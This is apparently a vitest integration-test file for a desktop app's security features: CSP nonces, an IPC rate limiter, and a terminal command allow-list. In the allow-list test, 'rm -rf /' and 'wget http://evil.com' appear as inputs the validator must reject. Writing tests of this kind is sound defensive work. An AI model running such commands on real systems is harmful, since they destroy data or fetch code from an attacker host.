/**
 * SA4E-85 — Integration Tests: Security (IT-SEC-01/02/03).
 * Tests CSP enforcement, rate limiter under load, terminal command validation.
 */

import { describe, test, expect } from 'vitest';
import * as crypto from 'crypto';

describe('IT-SEC-01: CSP Enforcement Blocks Inline Script', () => {
  test('CSP header includes nonce directive', () => {
    const nonce = crypto.randomBytes(16).toString('base64');
    const csp = "default-src 'none'; script-src 'nonce-" + nonce + "'; style-src 'unsafe-inline'";
    expect(csp).toContain('script-src');
    expect(csp).toContain(nonce);
  });

  test('inline script without nonce would be blocked', () => {
    const nonce = crypto.randomBytes(16).toString('base64');
    const scriptNonce = 'wrong-nonce';
    expect(scriptNonce).not.toBe(nonce);
  });
});

describe('IT-SEC-02: IPC Rate Limiter Under Load', () => {
  test('200 messages in burst — only 100 accepted', () => {
    let count = 0;
    const max = 100;
    const tryAccept = () => { if (count < max) { count++; return true; } return false; };
    let accepted = 0;
    for (let i = 0; i < 200; i++) { if (tryAccept()) accepted++; }
    expect(accepted).toBe(100);
  });
});

describe('IT-SEC-03: Terminal Command Validation Integration', () => {
  const ALLOWED = ['kiro', 'antigravity', 'npm', 'node', 'npx'];
  function validate(cmd: string): boolean {
    return ALLOWED.includes(cmd.trim().split(/\s+/)[0]);
  }

  test('allowed command spawns terminal', () => {
    expect(validate('kiro start')).toBe(true);
    expect(validate('npm run dev')).toBe(true);
  });

  test('disallowed command is rejected', () => {
    expect(validate('rm -rf /')).toBe(false);
    expect(validate('wget http://evil.com')).toBe(false);
  });
});
